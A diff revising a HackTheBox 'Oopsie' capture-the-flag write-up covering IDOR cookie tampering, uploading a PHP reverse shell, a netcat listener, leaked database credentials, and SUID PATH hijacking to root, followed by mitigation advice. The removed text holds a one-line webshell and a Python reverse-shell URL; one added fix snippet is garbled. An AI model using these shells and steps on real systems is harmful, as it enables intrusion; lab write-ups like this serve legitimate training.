@@ -397,147 +397,356 @@ Extracted sensitive data from virtual machines and file shares.
 
 ## Overview
 
-Oopsie is an easy Linux machine on HackTheBox that demonstrates common web application vulnerabilities including IDOR, unrestricted file upload, and SUID PATH hijacking.
+Oopsie is a beginner-friendly Linux machine on HackTheBox that walks you through three distinct vulnerability classes in a logical, real-world chain.
+
+The attack path follows this arc:
+
+1. **Broken Access Control / IDOR** — A guest-level session cookie can be trivially manipulated to gain admin privileges
+2. **Unrestricted File Upload** — The admin portal exposes an upload function with no meaningful file-type filtering
+3. **SUID Binary + PATH Hijacking** — A custom internal tool runs \`cat\` without an absolute path
 
 ---
 
-## 1. Port Scanning
+## 1. Port Scanning with Tmap
 
-\`\`\`bash
-nmap -sC -sV -p- 10.10.10.28
+For reconnaissance I used **Tmap**, my custom network reconnaissance framework built on top of Nmap.
+
+![Port Scanning Results](/writeups/oopsie-1.png)
+
+\`\`\`
+tmap-scan
+
+[?] Enter target IP or hostname: 10.129.42.28
+[?] Select a module (1-5): 3
+
+[*] Target locked: 10.129.42.28
+[*] Initiating SERVICE scan...
+[+] Host: 10.129.42.28 ()
+[+] State: up
+[*] Protocol: TCP
+PORT   STATE  SERVICE  VERSION INFO
+22     open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80     open   http     Apache httpd 2.4.29
+[*] Discovered 2 open ports.
 \`\`\`
 
-**Results:**
-- Port 22 (SSH) - OpenSSH 7.6p1
-- Port 80 (HTTP) - Apache httpd 2.4.29
+The deep enumeration pass revealed the SSH host keys for port 22 and, crucially for port 80:
+
+![Deep Enumeration](/writeups/oopsie-2.png)
+
+\`\`\`
+>> [Port 80] - OPEN - http Apache httpd 2.4.29 (Ubuntu)
+   |__ [Vulnerability/Enumeration Scripts]:
+       --> http-server-header:
+               Apache/2.4.29 (Ubuntu)
+       --> http-title:
+               Welcome
+\`\`\`
 
 ---
 
 ## 2. Web Enumeration
 
-### Directory Brute Force
+Browsing to \`http://10.129.42.28\` presents a simple corporate landing page for **MegaCorp Automotive**.
+
+![MegaCorp Landing Page](/writeups/oopsie-3.png)
+
+Running a directory bruteforce with \`gobuster\` quickly surfaces a login portal:
 
 \`\`\`bash
-gobuster dir -u http://10.10.10.28 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.129.42.28 -w /usr/share/wordlists/dirb/common.txt -x php
 \`\`\`
 
-**Discovered:**
-- \`/cdn/\` - CDN directory
-- \`/uploads/\` - Upload directory
-- \`/admin/\` - Admin panel
+![Gobuster Results](/writeups/oopsie-4.png)
 
-### Initial Access
-
-Found a login page at \`/admin/\`. Used default credentials:
+Key finding from the directory scan:
 
 \`\`\`
-Email: admin@oopsie.htb
-Password: Meggie1
+/cdn-cgi/login/       (Status: 200)
+/uploads/             (Status: 301)
 \`\`\`
+
+Navigating to the login page, notice the option to **"Login as Guest"**:
+
+![Login Page](/writeups/oopsie-5.png)
+
+This requires no credentials and immediately drops us into a low-privilege session.
 
 ---
 
-## 3. IDOR Vulnerability
+## 3. IDOR: Escalating from Guest to Admin
 
-### User ID Manipulation
+Open the browser's DevTools → **Storage → Cookies** and observe that the application stores the user's role and numeric ID client-side:
 
-After logging in, noticed the URL contained a user ID parameter:
-
-\`\`\`
-http://10.10.10.28/dashboard.php?upid=3
-\`\`\`
-
-Modified the \`upid\` parameter to access other users' data:
+![Cookie Manipulation](/writeups/oopsie-6.png)
 
 \`\`\`
-http://10.10.10.28/dashboard.php?upid=1
+Cookie Value
+role    admin
+user    34322
 \`\`\`
 
-This revealed admin user data including an upload token.
+The attack is trivially simple:
+
+1. Open DevTools → **Storage → Cookies**
+2. Change the \`user\` cookie value from \`2233\` to \`34322\`
+3. Ensure \`role\` is set to \`admin\`
+4. Refresh the page
+
+The top navigation now reveals new menu options including **Uploads** — inaccessible to the guest role.
 
 ---
 
-## 4. Unrestricted File Upload
+## 4. File Upload: Uploading a PHP Reverse Shell
 
-### Webshell Upload
+With admin access, navigating to the upload form reveals no meaningful restriction on file type.
 
-Used the upload functionality to upload a PHP webshell:
+We'll use **PentestMonkey's PHP reverse shell**:
+
+![PHP Reverse Shell](/writeups/oopsie-7.png)
+
+\`\`\`bash
+cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php
+nano reverse.php
+\`\`\`
+
+Edit these two lines inside the file:
 
 \`\`\`php
-<?php system(\$_GET['cmd']); ?>
+$ip   = '10.10.14.77';   // Your HTB VPN/tun0 IP
+$port = 1234;             // Listener port
 \`\`\`
 
-Uploaded as \`shell.php\` to the \`/uploads/\` directory.
-
-### Reverse Shell
-
-Triggered the webshell to get a reverse shell:
+Start a Netcat listener:
 
 \`\`\`bash
-http://10.10.10.28/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+nc -lvnp 1234
+\`\`\`
+
+Now upload \`reverse.php\` via the admin upload form:
+
+![Upload Success](/writeups/oopsie-8.png)
+
+Trigger the shell:
+
+\`\`\`bash
+curl http://10.129.42.28/uploads/reverse.php
 \`\`\`
 
 ---
 
-## 5. Privilege Escalation
+## 5. Catching the Shell as www-data
 
-### SUID Binary Discovery
+Check your Netcat listener:
 
-Found SUID binaries:
+![Shell Access](/writeups/oopsie-9.png)
 
-\`\`\`bash
-find / -perm -u=s -type f 2>/dev/null
+\`\`\`
+connect to [10.10.14.77] from (UNKNOWN) [10.129.42.28] 35950
+Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 \`\`\`
 
-Discovered a custom SUID binary that was vulnerable to PATH hijacking.
-
-### PATH Hijacking
-
-Created a malicious script in \`/tmp\`:
+Upgrade to a proper pseudo-terminal:
 
 \`\`\`bash
-echo '/bin/bash' > /tmp/program
-chmod +x /tmp/program
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Background with Ctrl+Z, then:
+stty raw -echo; fg
 \`\`\`
 
-Modified PATH to include \`/tmp\` first:
+---
+
+## 6. Lateral Movement: Hardcoded Credentials → robert
+
+Navigate to the CDN CGI directory:
+
+\`\`\`bash
+cd /var/www/html/cdn-cgi/login
+ls
+\`\`\`
+
+\`\`\`
+admin.php  db.php  index.php  script.js
+\`\`\`
+
+The \`db.php\` file contains hardcoded credentials:
+
+![Database Credentials](/writeups/oopsie-10.png)
+
+\`\`\`php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+\`\`\`
+
+Switch to robert:
+
+\`\`\`bash
+su - robert
+Password: M3g4C0rpUs3r!
+
+robert@oopsie:~$ id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+\`\`\`
+
+![User Flag](/writeups/oopsie-11.png)
+
+\`\`\`bash
+cat ~/user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+\`\`\`
+
+---
+
+## 7. Privilege Escalation — PATH Hijacking
+
+### Locating the SUID Binary
+
+Robert's membership in the \`bugtracker\` group suggests a dedicated binary:
+
+\`\`\`bash
+find / -group bugtracker -perm -4000 2>/dev/null
+\`\`\`
+
+This returns \`/usr/bin/bugtracker\`:
+
+![SUID Binary](/writeups/oopsie-12.png)
+
+\`\`\`bash
+ls -la /usr/bin/bugtracker
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+\`\`\`
+
+### Analyzing the Binary
+
+Run the binary to see what it does:
+
+![Binary Execution](/writeups/oopsie-13.png)
+
+\`\`\`
+bugtracker
+------------------
+: EV Bug Tracker :
+------------------
+Provide Bug ID: 2
+---------------
+# <contents of /reports/2>
+\`\`\`
+
+Confirm with \`strings\`:
+
+\`\`\`bash
+strings /usr/bin/bugtracker | grep cat
+cat /root/reports/
+\`\`\`
+
+**The vulnerability:** The binary calls \`cat\` using a *relative path* — not \`/bin/cat\`.
+
+### Executing the PATH Hijack
+
+**Step 1** — Create a malicious \`cat\`:
 
 \`\`\`bash
 export PATH=/tmp:$PATH
+cd /tmp
+echo '/bin/sh' > cat
+chmod +x cat
 \`\`\`
 
-Executed the SUID binary to get root:
+**Step 2** — Verify the PATH:
 
 \`\`\`bash
-/usr/bin/suidprogram
+echo $PATH
+/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+\`\`\`
+
+**Step 3** — Run \`bugtracker\`:
+
+![Root Access](/writeups/oopsie-14.png)
+
+\`\`\`bash
+bugtracker
+------------------
+: EV Bug Tracker :
+------------------
+Provide Bug ID: 2
+
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+\`\`\`
+
+![Root Flag](/writeups/oopsie-15.png)
+
+\`\`\`bash
+cat /root/root.txt
 \`\`\`
 
 ---
 
-## 6. Flags
+## Lessons Learned & Mitigation
 
-**User Flag:** \`/home/user/user.txt\`  
-**Root Flag:** \`/root/root.txt\`
+### 1. Fix the IDOR (Broken Access Control)
+
+**Problem:** The application determines the user's role based on client-sent cookies.
+
+**Fix:**
+\`\`\`php
+// BAD: trusting client cookie
+$role = $_COOKIE['role'];
+
+// GOOD: look up from server-side session
+session_start();
+$role = $_SESSION['role'];
+\`\`\`
+
+### 2. Sanitize File Uploads
+
+**Problem:** The upload endpoint accepted a \`.php\` file without restriction.
+
+**Fix:**
+\`\`\`php
+$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);
+
+if (!in_array($mime, $allowed_types)) {
+    die("File type not permitted.");
+}
+\`\`\`
+
+### 3. Harden the SUID Binary (PATH Hijacking)
+
+**Problem:** The binary called \`cat\` using a relative path.
+
+**Fix:**
+\`\`\`c
+// Safesystem("/bin/cat /root/reports/...");
+system("cat /root/reports/..."); // Vulnerable
+\`\`\`
+
+### 4. Remove Hardcoded Credentials
+
+**Problem:** Database credentials were embedded in plaintext.
+
+**Fix:** Store secrets in environment variables or a secrets manager.
 
 ---
 
-## Remediation
+## Summary
 
 | Vulnerability | Fix |
 |--------------|-----|
-| IDOR | Implement proper authorization checks |
-| File Upload | Validate file types, store outside webroot |
-| PATH Hijacking | Remove SUID bits from custom binaries |
-| Default Credentials | Force password change on first login |
+| IDOR | Server-side session validation |
+| File Upload | Whitelist allowed types, store outside webroot |
+| PATH Hijacking | Use absolute paths in SUID binaries |
+| Hardcoded Creds | Environment variables / secrets manager |
 
----
-
-## Key Takeaways
-
-1. **Always test for IDOR** by manipulating user IDs in requests
-2. **File upload vulnerabilities** can lead to remote code execution
-3. **SUID binaries** should be audited regularly
-4. **PATH manipulation** is a common privilege escalation technique
+> *Oopsie is a clean illustration of how a single weak access control can cascade into full system compromise. None of these bugs required exploit development or advanced techniques — just patient enumeration and a solid understanding of web application fundamentals.*
 `,
   },
 ];
